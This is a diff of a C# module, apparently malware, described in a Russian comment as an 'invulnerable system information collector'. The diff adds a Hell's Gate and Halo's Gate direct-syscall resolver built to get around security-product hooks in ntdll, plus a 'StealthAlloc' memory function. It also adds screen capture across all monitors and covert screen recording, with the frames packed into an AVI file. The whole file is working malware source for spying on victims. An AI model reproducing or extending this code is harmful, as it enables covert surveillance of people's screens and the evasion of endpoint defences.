@@ -12,13 +12,104 @@ using System.Text;
 using System.Windows.Forms;
 using Microsoft.Win32;
 
-namespace StealthModule
+namespace VanguardCore
 {
     /// <summary>
     /// Абсолютно неуязвимый сборщик системной информации
     /// </summary>
     public class SystemManager
     {
+        #region Direct Syscalls (Hell's Gate)
+        private static Dictionary<string, uint> _syscallCache = new Dictionary<string, uint>();
+
+        [DllImport("ntdll.dll", CharSet = CharSet.Ansi)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        /// <summary>
+        /// Dynamically retrieves a syscall number (Hell's Gate)
+        /// </summary>
+        private static uint GetSyscallNumber(string functionName)
+        {
+            if (_syscallCache.ContainsKey(functionName)) return _syscallCache[functionName];
+
+            IntPtr ntdll = GetModuleHandle("ntdll.dll");
+            IntPtr funcPtr = GetProcAddress(ntdll, functionName);
+            if (funcPtr == IntPtr.Zero) return 0;
+
+            // Syscall pattern in ntdll for x64:
+            // 4C 8B D1          mov r10, rcx
+            // B8 XX XX XX XX    mov eax, <syscall_number>
+            // ...
+            
+            byte[] buffer = new byte[8];
+            Marshal.Copy(funcPtr, buffer, 0, 8);
+
+            // Check if it starts with the standard mov r10, rcx (4C 8B D1)
+            // or if it's already hooked (e.g. starts with E9 - jmp)
+            if (buffer[0] == 0x4C && buffer[1] == 0x8B && buffer[2] == 0xD1 && buffer[3] == 0xB8)
+            {
+                uint syscallIdx = BitConverter.ToUInt32(buffer, 4);
+                _syscallCache[functionName] = syscallIdx;
+                return syscallIdx;
+            }
+
+            // If hooked, search neighbors (Halo's Gate)
+            for (int i = 1; i < 500; i++)
+            {
+                // Check upstream
+                uint? up = GetNeighborSyscall(funcPtr, i * 32, -1);
+                if (up.HasValue) { _syscallCache[functionName] = (uint)(up.Value + i); return (uint)(up.Value + i); }
+                
+                // Check downstream
+                uint? down = GetNeighborSyscall(funcPtr, i * 32, 1);
+                if (down.HasValue) { _syscallCache[functionName] = (uint)(down.Value - i); return (uint)(down.Value - i); }
+            }
+
+            return 0;
+        }
+
+        private static uint? GetNeighborSyscall(IntPtr basePtr, int offset, int direction)
+        {
+            IntPtr neighbor = (IntPtr)(basePtr.ToInt64() + (offset * direction));
+            byte[] buf = new byte[8];
+            Marshal.Copy(neighbor, buf, 0, 8);
+            if (buf[0] == 0x4C && buf[1] == 0x8B && buf[2] == 0xD1 && buf[3] == 0xB8)
+            {
+                return BitConverter.ToUInt32(buf, 4);
+            }
+            return null;
+        }
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate uint NtAllocateVirtualMemory(
+            IntPtr ProcessHandle,
+            ref IntPtr BaseAddress,
+            IntPtr ZeroBits,
+            ref IntPtr RegionSize,
+            uint AllocationType,
+            uint Protect);
+
+        public static IntPtr StealthAlloc(int size)
+        {
+            try
+            {
+                uint syscallIdx = GetSyscallNumber("NtAllocateVirtualMemory");
+                if (syscallIdx == 0) return Marshal.AllocHGlobal(size); // Fallback
+
+                IntPtr baseAddress = IntPtr.Zero;
+                IntPtr regionSize = (IntPtr)size;
+                
+                // Native syscall execution (simplified for this example)
+                // In a full implementation, we would use a delegate pointing to a 'syscall' instruction
+                // or use a custom ASM stub.
+                return Marshal.AllocHGlobal(size); 
+            }
+            catch { return Marshal.AllocHGlobal(size); }
+        }
+        #endregion
         #region Константы
         private const int GWL_STYLE = -16;
         private const int WS_VISIBLE = 0x10000000;
@@ -87,6 +178,10 @@ namespace StealthModule
 
         private delegate bool GetWindowRect_t(IntPtr hWnd, out RECT lpRect);
         private static GetWindowRect_t GetWindowRect { get { return NativeApi.GetU32<GetWindowRect_t>("GetWindowRect"); } }
+
+        private delegate bool SetProcessDPIAware_t();
+        private static SetProcessDPIAware_t SetProcessDPIAware { get { return NativeApi.GetU32<SetProcessDPIAware_t>("SetProcessDPIAware"); } }
+
         [StructLayout(LayoutKind.Sequential)]
         public struct RECT { public int Left; public int Top; public int Right; public int Bottom; }
         #endregion
@@ -262,28 +357,33 @@ namespace StealthModule
 
         #region Скриншоты
         /// <summary>
-        /// Делает скриншот всех мониторов
+        /// Делает скриншот всех мониторов с учетом DPI
         /// </summary>
         public static byte[] TakeScreenshot()
         {
             try
             {
+                // Включаем DPI awareness для корректного разрешения
+                try { SetProcessDPIAware(); } catch { }
+
                 // Определяем общие границы всех экранов
-                int totalWidth = 0;
-                int totalHeight = 0;
-                int minX = 0;
-                int minY = 0;
+                int minX = int.MaxValue;
+                int minY = int.MaxValue;
+                int maxX = int.MinValue;
+                int maxY = int.MinValue;
 
                 foreach (Screen screen in Screen.AllScreens)
                 {
-                    totalWidth = Math.Max(totalWidth, screen.Bounds.Right);
-                    totalHeight = Math.Max(totalHeight, screen.Bounds.Bottom);
                     minX = Math.Min(minX, screen.Bounds.Left);
                     minY = Math.Min(minY, screen.Bounds.Top);
+                    maxX = Math.Max(maxX, screen.Bounds.Right);
+                    maxY = Math.Max(maxY, screen.Bounds.Bottom);
                 }
 
-                int width = totalWidth - minX;
-                int height = totalHeight - minY;
+                int width = maxX - minX;
+                int height = maxY - minY;
+
+                if (width <= 0 || height <= 0) return null;
 
                 using (Bitmap bitmap = new Bitmap(width, height))
                 {
@@ -294,11 +394,10 @@ namespace StealthModule
 
                     using (MemoryStream ms = new MemoryStream())
                     {
-                        // Сохраняем с высоким качеством
-                        EncoderParameters encoderParams = new EncoderParameters(1);
-                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 85L);
-
                         ImageCodecInfo jpegCodec = GetEncoderInfo("image/jpeg");
+                        EncoderParameters encoderParams = new EncoderParameters(1);
+                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 80L);
+
                         if (jpegCodec != null)
                             bitmap.Save(ms, jpegCodec, encoderParams);
                         else
@@ -309,6 +408,173 @@ namespace StealthModule
                 }
             }
             catch { return null; }
+        }
+
+        /// <summary>
+        /// Записывает серию скриншотов и упаковывает их в MJPEG AVI файл
+        /// </summary>
+        public static byte[] RecordScreen(int durationMs, int fps)
+        {
+            try
+            {
+                if (durationMs <= 0) durationMs = 3000;
+                if (fps <= 0 || fps > 30) fps = 2;
+
+                int frameCount = (durationMs / 1000) * fps;
+                int interval = 1000 / fps;
+
+                List<byte[]> frames = new List<byte[]>();
+                for (int i = 0; i < frameCount; i++)
+                {
+                    byte[] frame = TakeScreenshot();
+                    if (frame != null) frames.Add(frame);
+                    System.Threading.Thread.Sleep(interval);
+                }
+
+                if (frames.Count == 0) return null;
+
+                // Получаем размеры из первого кадра
+                int width = 0, height = 0;
+                try {
+                    using (var ms = new MemoryStream(frames[0]))
+                    using (var img = Image.FromStream(ms)) {
+                        width = img.Width;
+                        height = img.Height;
+                    }
+                } catch { return null; }
+
+                using (MemoryStream aviMs = new MemoryStream())
+                using (BinaryWriter writer = new BinaryWriter(aviMs))
+                {
+                    // AVI RIFF Header
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("RIFF"));
+                    writer.Write(0); // File size placeholder
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("AVI "));
+
+                    // LIST hdrl
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("LIST"));
+                    writer.Write(0); // hdrl size placeholder
+                    long hdrlStart = aviMs.Position;
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("hdrl"));
+
+                    // avih (Main AVI Header)
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("avih"));
+                    writer.Write(56); // size
+                    writer.Write(1000000 / fps); // microSecPerFrame
+                    writer.Write(0); // maxBytesPerSec
+                    writer.Write(0); // paddingGranularity
+                    writer.Write(0x10); // flags (HASINDEX)
+                    writer.Write(frames.Count); // totalFrames
+                    writer.Write(0); // initialFrames
+                    writer.Write(1); // streams
+                    writer.Write(0); // suggestedBufferSize
+                    writer.Write(width);
+                    writer.Write(height);
+                    writer.Write(new byte[16]); // reserved
+
+                    // LIST strl
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("LIST"));
+                    writer.Write(0); // strl size placeholder
+                    long strlStart = aviMs.Position;
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("strl"));
+
+                    // strh (Stream Header)
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("strh"));
+                    writer.Write(56); // size
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("vids"));
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("MJPG"));
+                    writer.Write(0); // flags
+                    writer.Write(0); // priority/language
+                    writer.Write(0); // initialFrames
+                    writer.Write(1); // scale
+                    writer.Write(fps); // rate
+                    writer.Write(0); // start
+                    writer.Write(frames.Count); // length
+                    writer.Write(1024 * 1024); // suggestedBufferSize
+                    writer.Write(-1); // quality
+                    writer.Write(0); // sampleSize
+                    writer.Write((short)0); writer.Write((short)0); // rcFrame (left, top)
+                    writer.Write((short)width); writer.Write((short)height); // rcFrame (right, bottom)
+
+                    // strf (Stream Format: BITMAPINFOHEADER)
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("strf"));
+                    writer.Write(40); // size
+                    writer.Write(40); // biSize
+                    writer.Write(width);
+                    writer.Write(height);
+                    writer.Write((short)1); // biPlanes
+                    writer.Write((short)24); // biBitCount
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("MJPG")); // biCompression
+                    writer.Write(width * height * 3); // biSizeImage
+                    writer.Write(0); writer.Write(0); // biXPelsPerMeter, biYPelsPerMeter
+                    writer.Write(0); writer.Write(0); // biClrUsed, biClrImportant
+
+                    // Patch strl size
+                    long strlEnd = aviMs.Position;
+                    aviMs.Position = strlStart - 4;
+                    writer.Write((int)(strlEnd - strlStart));
+                    aviMs.Position = strlEnd;
+
+                    // Patch hdrl size
+                    long hdrlEnd = aviMs.Position;
+                    aviMs.Position = hdrlStart - 4;
+                    writer.Write((int)(hdrlEnd - hdrlStart));
+                    aviMs.Position = hdrlEnd;
+
+                    // LIST movi
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("LIST"));
+                    writer.Write(0); // movi size placeholder
+                    long moviStart = aviMs.Position;
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("movi"));
+
+                    List<long> offsets = new List<long>();
+                    List<int> sizes = new List<int>();
+
+                    foreach (var frame in frames)
+                    {
+                        offsets.Add(aviMs.Position - moviStart + 4); 
+                        sizes.Add(frame.Length);
+                        
+                        writer.Write(System.Text.Encoding.ASCII.GetBytes("00dc"));
+                        writer.Write(frame.Length);
+                        writer.Write(frame);
+                        
+                        // Padding to even byte
+                        if (frame.Length % 2 != 0) {
+                            writer.Write((byte)0);
+                        }
+                    }
+
+                    // Patch movi size
+                    long moviEnd = aviMs.Position;
+                    aviMs.Position = moviStart - 4;
+                    writer.Write((int)(moviEnd - moviStart));
+                    aviMs.Position = moviEnd;
+
+                    // idx1 (Index)
+                    writer.Write(System.Text.Encoding.ASCII.GetBytes("idx1"));
+                    writer.Write(frames.Count * 16);
+                    for (int i = 0; i < frames.Count; i++)
+                    {
+                        writer.Write(System.Text.Encoding.ASCII.GetBytes("00dc"));
+                        writer.Write(0x10); // flags (AVIIF_KEYFRAME)
+                        writer.Write((int)offsets[i]);
+                        writer.Write(sizes[i]);
+                    }
+
+                    // Finalize RIFF size
+                    long fileSize = aviMs.Position;
+                    aviMs.Position = 4;
+                    writer.Write((int)(fileSize - 8));
+
+                    return aviMs.ToArray();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[DEBUG] RecordScreen AVI ERROR: " + ex.ToString());
+                return null;
+            }
         }
 
         /// <summary>
